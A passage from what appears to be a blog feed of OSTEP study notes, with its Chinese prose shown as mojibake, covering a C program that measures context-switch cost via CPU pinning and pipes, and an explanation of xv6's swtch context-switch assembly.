start="2"><li></li></ol><p>éœ€è¦æµ‹é‡ä¸Šä¸‹æ–‡åˆ‡æ¢æˆæœ¬ï¼Œ</p><p>éœ€è¦æŠŠç¨‹åºé™åˆ¶åˆ°ä¸€ä¸ªcpuä¸Šåšåˆ‡æ¢ï¼Œè¿™æ¬¡æˆ‘ä»¬ç”¨<code>sched_setaffinity</code>æ¥å®ç°ç»‘å®šæŒ‡å®šå¤„ç†å™¨è€Œä¸æ˜¯ç”¨taskset(PS:ç®€å•æµ‹è¯•äº†ä¸€ä¸‹forkå­è¿›ç¨‹æ˜¯ä¼šè·‘åœ¨çˆ¶è¿›ç¨‹çš„cpuäº²åˆåŠ›æ©ç )</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE             <span class="comment">/* See feature_test_macros(7) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sched_setaffinity</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">size_t</span> cpusetsize,</span></span><br><span class="line"><span class="params">                      <span class="type">const</span> <span class="type">cpu_set_t</span> *mask)</span>;</span><br><span class="line">pidä¸º<span class="number">0</span>è®¾ç½®å½“å‰è¿›ç¨‹å¦åˆ™pidè¿›ç¨‹</span><br><span class="line">cpusetsizeä¸€èˆ¬ç»™<span class="keyword">sizeof</span>(<span class="type">cpu_set_t</span>)</span><br><span class="line">mask CPUä½æ©ç  çš„æ“ä½œ</span><br><span class="line">CPU_ZERO()ï¼šæ¸…é™¤é›†åˆçš„å†…å®¹ï¼Œè®©å…¶ä¸åŒ…å«ä»»ä½•CPUã€‚</span><br><span class="line"></span><br><span class="line">CPU_SET()ï¼šæ·»åŠ cpuåˆ°é›†åˆä¸­ã€‚</span><br><span class="line"></span><br><span class="line">CPU_CLR()ï¼šä»é›†åˆä¸­ç§»é™¤cpu</span><br><span class="line"></span><br><span class="line"><span class="title function_">CPU_ISSET</span><span class="params">()</span> ï¼šæµ‹è¯•cpuæ˜¯å¦åœ¨é›†åˆä¸­ã€‚</span><br><span class="line"></span><br><span class="line"><span class="title function_">CPU_COUNT</span><span class="params">()</span>ï¼šè¿”å›é›†åˆä¸­åŒ…å«çš„CPUæ•°é‡ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE        </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>   <span class="comment">// exit</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span> <span class="comment">// waitpid</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>   <span class="comment">// fork, pipe, close, write, dup2</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> mask;</span><br><span class="line">    CPU_ZERO(&amp;mask);</span><br><span class="line">    CPU_SET(<span class="number">3</span>, &amp;mask);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">2</span>];</span><br><span class="line">    <span class="type">pid_t</span> rc;</span><br><span class="line">    <span class="type">int</span> re = sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(mask), &amp;mask);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">-1</span> == re) &#123;</span><br><span class="line">        perror(<span class="string">&quot;sched_setscheduler&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> pipefd1[<span class="number">2</span>], pipefd2[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipefd1) &lt; <span class="number">0</span> || pipe(pipefd2) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;;</span><br><span class="line">    rc = fork();</span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;----------------------%d\n&quot;, i);</span></span><br><span class="line">            read(pipefd1[<span class="number">0</span>], buf, <span class="number">1</span>);</span><br><span class="line">            write(pipefd2[<span class="number">1</span>], <span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> timespec start_time, end_time;</span><br><span class="line">        clock_gettime(CLOCK_MONOTONIC, &amp;start_time);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;+++++%d\n&quot;, i);</span></span><br><span class="line">            write(pipefd1[<span class="number">1</span>], <span class="string">&quot;0&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            read(pipefd2[<span class="number">0</span>], buf, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        clock_gettime(CLOCK_MONOTONIC, &amp;end_time);</span><br><span class="line">        <span class="type">double</span> elapsed_time = (end_time.tv_sec * <span class="number">1e9</span> + end_time.tv_nsec - start_time.tv_sec * <span class="number">1e9</span> - start_time.tv_nsec) / <span class="number">1000000</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ns:%f\n&quot;</span>, elapsed_time);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;us:%f\n&quot;</span>, elapsed_time / <span class="number">1000.0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ms:%f\n&quot;</span>, elapsed_time / <span class="number">1e6</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ä½ ä¸€äº›cpu affinityçˆ¶å­éƒ½ç»‘å®šåˆ°äº†8(100)å°±æ˜¯æˆ‘ä»¬çš„è®¾ç½®çš„ç¬¬ä¸‰ä¸ªcpu<code>    CPU_SET(3, &amp;mask);</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~&gt; ps -a</span><br><span class="line">    PID TTY          TIME CMD</span><br><span class="line">   2677 pts/12   00:00:04 fish</span><br><span class="line">   8612 tty2     00:00:00 gnome-session-b</span><br><span class="line">   9251 pts/13   00:00:00 tmux: client</span><br><span class="line">   9276 pts/14   00:00:00 fish</span><br><span class="line">   9316 pts/15   00:00:00 fish</span><br><span class="line">  36681 pts/14   00:00:01 gdb</span><br><span class="line">  36697 pts/14   00:00:00 test &lt;defunct&gt;</span><br><span class="line">  48284 pts/23   00:00:00 fish</span><br><span class="line">  50253 pts/24   00:00:00 fish</span><br><span class="line">  54215 pts/38   00:00:02 2</span><br><span class="line">  54216 pts/38   00:00:02 2</span><br><span class="line">  54309 pts/24   00:00:00 ps</span><br><span class="line">grxer@grxer ~&gt; taskset -p 54216</span><br><span class="line">pid 54216&#x27;s current affinity mask: 8</span><br><span class="line">grxer@grxer ~&gt; taskset -p 54215</span><br><span class="line">pid 54215&#x27;s current affinity mask: 8</span><br></pre></td></tr></table></figure><p>äº¤æ›¿é˜»å¡ï¼Œäº¤æ›¿ä¸Šä¸‹æ–‡åˆ‡æ¢</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/<span class="number">6</span> [SIGINT]&gt; gcc -g -o <span class="number">2</span> <span class="number">2.</span>c</span><br><span class="line">grxer@grxer ~/D/s/O/o/<span class="number">6</span>&gt; ./<span class="number">2</span></span><br><span class="line">ns:<span class="number">4238.650005</span></span><br><span class="line">us:<span class="number">4.238650</span></span><br><span class="line">ms:<span class="number">0.004239</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶é—´åº”è¯¥å†éœ€è¦å‡å»ä¸¤æ¬¡å†™å…¥ï¼Œä¸¤æ¬¡è¯»å–æ—¶é—´ï¼Œæ‡’å¾—æäº†</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:6 Mechanism:Limited Direct Execution</title>
      <link href="/2023/04/13/OSTEP-6-Mechanism-Limited-Direct-Execution/"/>
      <url>/2023/04/13/OSTEP-6-Mechanism-Limited-Direct-Execution/</url>
      
        <content type="html"><![CDATA[<h1 id="Mechanism-Limited-Direct-Execution"><a href="#Mechanism-Limited-Direct-Execution" class="headerlink" title="Mechanism:Limited Direct Execution"></a>Mechanism:Limited Direct Execution</h1><h2 id="å—é™åˆ¶çš„æ“ä½œ"><a href="#å—é™åˆ¶çš„æ“ä½œ" class="headerlink" title="å—é™åˆ¶çš„æ“ä½œ"></a>å—é™åˆ¶çš„æ“ä½œ</h2><p>è¿›ç¨‹è·‘åœ¨æˆ‘ä»¬çš„æ“ä½œç³»ç»Ÿä¸Šï¼Œæ€»ä¸èƒ½è®©ä»–ä¸ºæ‰€æ¬²ä¸ºå§ï¼Œcpuæä¾›ç»™äº†æˆ‘ä»¬ä¿æŠ¤æ¨¡å¼ï¼Œä»è€Œæœ‰äº†ç”¨æˆ·æ¨¡å¼å’Œå†…æ ¸æ¨¡å¼ï¼Œæˆ‘ä»¬çš„æ“ä½œç³»ç»Ÿè¿è¡Œåœ¨å†…æ ¸æ¨¡å¼ï¼Œå¯ä»¥è®¿é—®æœºå™¨å…¨éƒ¨èµ„æºï¼Œç”¨æˆ·è¿›ç¨‹è¿è¡Œåœ¨ç”¨æˆ·æ¨¡å¼ï¼Œå—åˆ°é™åˆ¶ï¼Œä½†æ˜¯ç”¨æˆ·ç¨‹åºæœ‰æ—¶å¿…é¡»åšä¸€äº›ç‰¹æƒæ“ä½œï¼Œæ“ä½œç³»ç»Ÿå°±å¿…é¡»æä¾›ç»™ä»–ä»¬ä¸€äº›æ¥å£:ç³»ç»Ÿè°ƒç”¨ã€‚</p><p>å¼‚å¸¸æ˜¯å¼‚å¸¸æ§åˆ¶æµçš„ä¸€ç§å½¢å¼ï¼Œå®ƒä¸€éƒ¨åˆ†ç”±ç¡¬ä»¶å®ç°ï¼Œä¸€éƒ¨åˆ†ç”±æ“ä½œç³»ç»Ÿå®ç°ã€‚é™·é˜±æ˜¯æœ‰æ„çš„å¼‚å¸¸,é™·é˜±æœ€é‡è¦çš„ç”¨é€”æ˜¯åœ¨ç”¨æˆ·ç¨‹åºå’Œå†…æ ¸ä¹‹é—´æä¾›ä¸€ä¸ªåƒè¿‡ç¨‹ä¸€æ ·çš„æ¥å£ç³»ç»Ÿè°ƒç”¨ï¼Œåœ¨ x86-64ç³»ç»Ÿä¸Šï¼Œç³»ç»Ÿè°ƒç”¨æ˜¯é€šè¿‡ä¸€æ¡ç§°ä¸º syscallçš„é™·é˜±æŒ‡ä»¤æ¥æä¾›çš„</p><p>åŠ ç”µå¼€æœºåï¼Œå¤„äºå†…æ ¸æ¨¡å¼ï¼Œæ“ä½œç³»ç»Ÿå†…æ ¸ä¼šå‘Šè¯‰ç¡¬ä»¶æˆ‘ä»¬çš„é™·é˜±å¤„ç†ç¨‹åº(é™·é˜±è¡¨)åœ¨å“ªï¼Œæ‰§è¡Œé™·é˜±å¤„ç†ç¨‹åºå‰ï¼Œ<strong>å¤„ç†å™¨</strong>ä¼šæŠŠè¿›ç¨‹çš„ä¸€äº›å¯„å­˜å™¨å€¼ç­‰å‹åˆ°è¯¥è¿›ç¨‹å†…æ ¸æ ˆ(åœ¨æˆ‘ä»¬32ä½ç¨‹åºè¿›ç¨‹è¯´çš„é«˜1Gå†…æ ¸ç©ºé—´é‡Œï¼Œåœ¨x86çš„32ä½æœºå™¨ä¸Šå†…æ ¸æ ˆå¤§å°å¯ä»¥ä¸º4KBæˆ–8KB)ï¼Œæ‰§è¡Œå®Œé™·é˜±è¿”å›æ—¶å†å¼¹å‡º</p><h2 id="åœ¨è¿›ç¨‹ä¹‹é—´åˆ‡æ¢"><a href="#åœ¨è¿›ç¨‹ä¹‹é—´åˆ‡æ¢" class="headerlink" title="åœ¨è¿›ç¨‹ä¹‹é—´åˆ‡æ¢"></a>åœ¨è¿›ç¨‹ä¹‹é—´åˆ‡æ¢</h2><p>æ“ä½œç³»ç»Ÿå¦‚ä½•é‡æ–°è·å¾— CPU çš„æ§åˆ¶æƒ</p><h3 id="åä½œæ–¹å¼-ç­‰å¾…ç³»ç»Ÿè°ƒç”¨"><a href="#åä½œæ–¹å¼-ç­‰å¾…ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="åä½œæ–¹å¼:ç­‰å¾…ç³»ç»Ÿè°ƒç”¨"></a>åä½œæ–¹å¼:ç­‰å¾…ç³»ç»Ÿè°ƒç”¨</h3><p>ç¨‹åºä¸»åŠ¨è¿›è¡Œç³»ç»Ÿè°ƒç”¨æˆ–å…¶ä»–ç±»å‹çš„å¼‚å¸¸æ¥é‡æ–°è·å–æ§åˆ¶æƒ</p><h3 id="éåä½œæ–¹å¼ï¼šæ“ä½œç³»ç»Ÿè¿›è¡Œæ§åˆ¶"><a href="#éåä½œæ–¹å¼ï¼šæ“ä½œç³»ç»Ÿè¿›è¡Œæ§åˆ¶" class="headerlink" title="éåä½œæ–¹å¼ï¼šæ“ä½œç³»ç»Ÿè¿›è¡Œæ§åˆ¶"></a>éåä½œæ–¹å¼ï¼šæ“ä½œç³»ç»Ÿè¿›è¡Œæ§åˆ¶</h3><p>åä½œæ–¹å¼å¯¹äºä¸€äº›åªå¾ªç¯çš„ç¨‹åºæ— èƒ½ä¸ºåŠ›ï¼Œé‚£å°±ç”¨ç¡¬ä»¶ä¸­æ–­</p><p>åˆ©ç”¨æ—¶é’Ÿè®¾å¤‡ï¼Œæ¯éš”å‡ æ¯«ç§’äº§ç”Ÿä¸€æ¬¡ä¸­æ–­ï¼Œä¸­æ–­å¤„ç†ç¨‹åºå‰ï¼Œ<strong>å¤„ç†å™¨</strong>ä¹Ÿä¼šæŠŠä¸€äº›å½“å‰è¿›ç¨‹ä¿¡æ¯å‹å…¥å…¶å†…æ ¸æ ˆ</p><h3 id="ä¿å­˜å’Œæ¢å¤ä¸Šä¸‹æ–‡"><a href="#ä¿å­˜å’Œæ¢å¤ä¸Šä¸‹æ–‡" class="headerlink" title="ä¿å­˜å’Œæ¢å¤ä¸Šä¸‹æ–‡"></a>ä¿å­˜å’Œæ¢å¤ä¸Šä¸‹æ–‡</h3><p>æ¥ä¸‹æ¥å°±æ˜¯<strong>è°ƒåº¦ç¨‹åº</strong>æ ¹æ®è°ƒåº¦ç­–ç•¥å†³å®šæ€ä¹ˆè·‘è·¯Zzz</p><p>å†³å®šåˆ‡æ¢çš„è¯ï¼Œä¼šè¿›è¡Œä¸Šä¸‹æ–‡åˆ‡æ¢(context switch)</p><p>å‡å¦‚ç”±Aåˆ‡æ¢åˆ°B</p><p>Açš„å¯„å­˜å™¨é¦–å…ˆè¢«ç¡¬ä»¶ä¿å­˜åˆ°è¯¥è¿›ç¨‹çš„å†…æ ¸æ ˆï¼Œè¿›å…¥å†…æ ¸æ€ï¼Œæ“ä½œç³»ç»Ÿåˆ‡æ¢æ—¶ï¼Œè°ƒç”¨switchå†æ¬¡æŠŠå¯„å­˜å™¨ä¿å­˜åˆ°æ“ä½œç³»ç»Ÿç»´æŒçš„<strong>Açš„è¿›ç¨‹ç»“æ„ä½“çš„å†…å­˜</strong>é‡Œï¼Œç„¶åæŠŠ<strong>è¦è°ƒåº¦Bè¿›ç¨‹ç»“æ„ä½“çš„å†…å­˜é‡Œçš„å€¼</strong>æ¢å¤åˆ°å¯„å­˜å™¨ï¼Œè¿™ä¸ªæ—¶å€™æ ˆæŒ‡é’ˆå·²ç»å˜ä¸ºäº†Bçš„å†…æ ¸æ ˆï¼Œä»å†…æ ¸æ ˆæ¢å¤å¯„å­˜å™¨å°±æ˜¯æ¢å¤Bçš„å¯„å­˜å™¨äº†ï¼Œå°±å¯ä»¥æŠŠä¹‹å‰ç¡¬ä»¶ä¿å­˜çš„Bè¿›ç¨‹çš„ä¸œè¥¿æ¢å¤ï¼Œå›åˆ°ç”¨æˆ·æ¨¡å¼æ‰§è¡ŒBçš„æŒ‡ä»¤</p><h4 id="xv6ä¸Šä¸‹æ–‡åˆ‡æ¢æºç "><a href="#xv6ä¸Šä¸‹æ–‡åˆ‡æ¢æºç " class="headerlink" title="xv6ä¸Šä¸‹æ–‡åˆ‡æ¢æºç "></a>xv6ä¸Šä¸‹æ–‡åˆ‡æ¢æºç </h4><p>ä¹¦é‡Œçš„ä»£ç æœ‰é”™è¯¯ï¼Œå»æ‰¾äº†æ³¢æºç  <a href="https://github.com/mit-pdos/xv6-public">https://github.com/mit-pdos/xv6-public</a> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#   void swtch(struct context *old, struct context *new);</span><br><span class="line">#  </span><br><span class="line"># Save current register context in old</span><br><span class="line"># and then load register context from new.</span><br><span class="line"></span><br><span class="line">.globl swtch</span><br><span class="line">swtch:</span><br><span class="line">  # Save old registers</span><br><span class="line">  movl 4(%esp), %eax</span><br><span class="line"></span><br><span class="line">  popl 0(%eax)  # %eip</span><br><span class="line">  movl %esp, 4(%eax)</span><br><span class="line">  movl %ebx, 8(%eax)</span><br><span class="line">  movl %ecx, 12(%eax)</span><br><span class="line">  movl %edx, 16(%eax)</span><br><span class="line">  movl %esi, 20(%eax)</span><br><span class="line">  movl %edi, 24(%eax)</span><br><span class="line">  movl %ebp, 28(%eax)</span><br><span class="line"></span><br><span class="line">  # Load new registers</span><br><span class="line">  movl 4(%esp), %eax  # not 8(%esp) - popped return address above</span><br><span class="line"></span><br><span class="line">  movl 28(%eax), %ebp</span><br><span class="line">  movl 24(%eax), %edi</span><br><span class="line">  movl 20(%eax), %esi</span><br><span class="line">  movl 16(%eax), %edx</span><br><span class="line">  movl 12(%eax), %ecx</span><br><span class="line">  movl 8(%eax), %ebx</span><br><span class="line">  movl 4(%eax), %esp</span><br><span class="line">  pushl 0(%eax)  # %eip</span><br><span class="line"></span><br><span class="line">  ret</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Saved registers for kernel context switches.</span></span><br><span class="line"><span class="comment">// Don&#x27;t need to save all the %fs etc. segment registers,</span></span><br><span class="line"><span class="comment">// because they are constant across kernel contexts.</span></span><br><span class="line"><span class="comment">// Save all the regular registers so we don&#x27;t need to care</span></span><br><span class="line"><span class="comment">// which are caller save, but not the return register %eax.</span></span><br><span class="line"><span class="comment">// (Not saving %eax just simplifies the switching code.)</span></span><br><span class="line"><span class="comment">// The layout of context must match code in swtch.S.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> eip;</span><br><span class="line">  <span class="type">int</span> esp;</span><br><span class="line">  <span class="type">int</span> ebx;</span><br><span class="line">  <span class="type">int</span> ecx;</span><br><span class="line">  <span class="type">int</span> edx;</span><br><span class="line">  <span class="type">int</span> esi;</span><br><span class="line">  <span class="type">int</span> edi;</span><br><span class="line">  <span class="type">int</span> ebp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ ¹æ®å‡½æ•°å£°æ˜å’Œ32ä½å‹æ ˆè§„åˆ™ï¼Œæ ˆåˆšå¼€å§‹æ˜¯è¿™æ ·çš„</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">oldAçš„å†…æ ¸æ ˆ</span><br><span class="line">+--------------+</span><br><span class="line">|               |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp</span></span><br><span class="line">|      ret(A)  |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp+4</span></span><br><span class="line">|     old(*)   | </span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp+8</span></span><br><span class="line">|     new(*)   |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><code>movl 4(%esp), %eax</code>æŠŠold(*)ç»™eax</p><p><code>popl 0(%eax)æŠŠeipå¯„å­˜å™¨ç»™åˆ°old-&gt;eip</code></p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">oldAçš„å†…æ ¸æ ˆ</span><br><span class="line">+--------------+ </span><br><span class="line">|               |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp</span></span><br><span class="line">|     old(*)   | </span><br><span class="line">+--------------+</span><br><span class="line">|     new(*)   |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p>åé¢ä¸€ç›´åˆ°<code>movl %ebp, 28(%eax)</code>æŠŠoldçš„contextç»“æ„ä½“é‡Œå†…å®¹å¡«æ»¡</p><p><code>movl 4(%esp), %eax</code>æŠŠæ–°çš„contextåœ°å€ç»™åˆ°eax</p><p>ä¸€ç›´åˆ°<code>movl 4(%eax), %esp</code>æŠŠæ–°contexté‡Œçš„å†…å®¹æ¢å¤åˆ°å¯„å­˜å™¨</p><p>å¯ä»¥çœ‹çš„æ ˆå¸§å¯„å­˜å™¨ebpï¼Œespéƒ½å˜äº†ï¼Œåˆ‡æ¢åˆ°äº†Bå†…æ ¸æ ˆ</p><p><code> pushl 0(%eax)  # %eip</code>æŠŠnewb-&gt;eipå‹æ ˆ</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">NewBçš„å†…æ ¸æ ˆ</span><br><span class="line">+--------------+</span><br><span class="line">|               |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp</span></span><br><span class="line">|      ret(B)  |</span><br><span class="line">+--------------+ </span><br><span class="line">|              | </span><br><span class="line">+--------------+ </span><br><span class="line">|              |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><h5 id="æ–°ç‰ˆ"><a href="#æ–°ç‰ˆ" class="headerlink" title="æ–°ç‰ˆ"></a>æ–°ç‰ˆ</h5><p>å…¶å®ä¸Šé¢æ˜¯æ¯”è¾ƒæ—©ç‰ˆæœ¬çš„swtchï¼Œæœ€æ–°çš„å·²ç»å˜äº†</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//PAGEBREAK: 17</span></span><br><span class="line"><span class="comment">// Saved registers for kernel context switches.</span></span><br><span class="line"><span class="comment">// Don&#x27;t need to save all the segment registers (%cs, etc),</span></span><br><span class="line"><span class="comment">// because they are constant across kernel contexts.</span></span><br><span class="line"><span class="comment">// Don&#x27;t need to save %eax, %ecx, %edx, because the</span></span><br><span class="line"><span class="comment">// x86 convention is that the caller has saved them.</span></span><br><span class="line"><span class="comment">// Contexts are stored at the bottom of the stack they</span></span><br><span class="line"><span class="comment">// describe; the stack pointer is the address of the context.</span></span><br><span class="line"><span class="comment">// The layout of the context matches the layout of the stack in swtch.S</span></span><br><span class="line"><span class="comment">// at the &quot;Switch stacks&quot; comment. Switch doesn&#x27;t save eip explicitly,</span></span><br><span class="line"><span class="comment">// but it is on the stack and allocproc() manipulates it.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span> &#123;</span></span><br><span class="line">  uint edi;</span><br><span class="line">  uint esi;</span><br><span class="line">  uint ebx;</span><br><span class="line">  uint ebp;</span><br><span class="line">  uint eip;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"># Context <span class="keyword">switch</span></span><br><span class="line">#</span><br><span class="line"><span class="meta">#   void swtch(struct context **old, struct context *new);</span></span><br><span class="line"># </span><br><span class="line"># Save the current registers on the <span class="built_in">stack</span>, creating</span><br><span class="line"><span class="meta"># a struct context, and save its address in *old.</span></span><br><span class="line"># Switch stacks to new and pop previously-saved registers.</span><br><span class="line"></span><br><span class="line">.globl swtch</span><br><span class="line">swtch:</span><br><span class="line">  movl <span class="number">4</span>(%esp), %eax</span><br><span class="line">  movl <span class="number">8</span>(%esp), %edx</span><br><span class="line"></span><br><span class="line">  # Save old callee-saved registers</span><br><span class="line">  pushl %ebp</span><br><span class="line">  pushl %ebx</span><br><span class="line">  pushl %esi</span><br><span class="line">  pushl %edi</span><br><span class="line"></span><br><span class="line">  # Switch stacks</span><br><span class="line">  movl %esp, (%eax)</span><br><span class="line">  movl %edx, %esp</span><br><span class="line"></span><br><span class="line">  # Load new callee-saved registers</span><br><span class="line">  popl %edi</span><br><span class="line">  popl %esi</span><br><span class="line">  popl %ebx</span><br><span class="line">  popl %ebp</span><br><span class="line">  ret</span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">oldAçš„å†…æ ¸æ ˆ</span><br><span class="line">+--------------+</span><br><span class="line">|               |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp</span></span><br><span class="line">|      ret(A)  |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp+4</span></span><br><span class="line">|     old(**)  | </span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp+8</span></span><br><span class="line">|     new(*)   |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><code> movl 4(%esp), %eax   movl 8(%esp), %edx</code></p><p>old(**)ç»™åˆ°eax</p><p>new(*)ç»™åˆ°edx</p><p>ç„¶åç›´æ¥æŠŠcontext pushåˆ°æ ˆä¸Š</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">oldAçš„å†…æ ¸æ ˆ</span><br><span class="line">+--------------+</span><br><span class="line">|               |</span><br><span class="line">+--------------+&lt;-- <span class="comment">%esp</span></span><br><span class="line">|      <span class="comment">%edi    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%esi    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%ebx    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%ebp       |</span></span><br><span class="line">+--------------+ </span><br><span class="line">|      ret(A)  |</span><br><span class="line">+--------------+ &lt;--<span class="comment">%eax</span></span><br><span class="line">|     old(**)  | </span><br><span class="line">+--------------+ &lt;--<span class="comment">%edx</span></span><br><span class="line">|     new(*)   |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><code>  movl %esp, (%eax)</code></p><p>ç›´æ¥æŠŠå½“å‰espæŒ‡å‘çš„åœ°å€å†™åˆ°oldAçš„contextçš„åœ°å€ï¼Œå°±æ˜¯æŠŠæ ˆä¸Šçš„è¿™äº›å½“ä½œcontextç»“æ„ä½“ï¼Œæ²¡å»å†å»å•ç‹¬ç”³è¯·å†…å­˜ï¼Œä¸ºäº†æé«˜æ•ˆç‡??</p><p><code>movl %edx, %esp</code></p><p>æŠŠæ ˆåˆ‡æ¢åˆ°NewBçš„å†…æ ¸æ ˆ,ç”±äºä¹‹å‰Bä¹Ÿè¢«åˆ‡æ¢è¿‡æ‰€ä»¥ä»–çš„æ ˆé¡¶ä¹Ÿæ˜¯contextç»“æ„ä½“</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">NewBçš„å†…æ ¸æ ˆ</span><br><span class="line">+--------------+</span><br><span class="line">|               |</span><br><span class="line">+--------------+&lt;-- <span class="comment">%esp</span></span><br><span class="line">|      <span class="comment">%edi    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%esi    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%ebx    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%ebp       |</span></span><br><span class="line">+--------------+ </span><br><span class="line">|      ret(B)  |</span><br><span class="line">+--------------+ </span><br></pre></td></tr></table></figure><p>popåretå°±å¯ä»¥åˆ‡æ¢åˆ°BæŒ‡ä»¤æ‰§è¡Œ</p><h3 id="å¹¶å‘é—®é¢˜ï¼ï¼ï¼"><a href="#å¹¶å‘é—®é¢˜ï¼ï¼ï¼" class="headerlink" title="å¹¶å‘é—®é¢˜ï¼ï¼ï¼"></a>å¹¶å‘é—®é¢˜ï¼ï¼ï¼</h3><p>ç³»ç»Ÿè°ƒç”¨æ—¶å‘ç”Ÿæ—¶é’Ÿä¸­æ–­?</p><p>ä¸­æ–­å¤„ç†æ—¶å‘ç”Ÿä¸­æ–­?</p><p>ç®€å•çš„åœ¨ä¸­æ–­æ—¶ç¦æ­¢ä¸­æ–­å¯èƒ½ä¼šå¯¼è‡´ä¸­æ–­ä¸¢å¤±?</p>]]></content>
      
      
      
        <tags>
            
            <tag> OSTEP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:5 Process API Homework</title>
      <link href="/2023/04/12/OSTEP-homework-5-Process-API/"/>
      <url>/2023/04/12/OSTEP-homework-5-Process-API/</url>
      
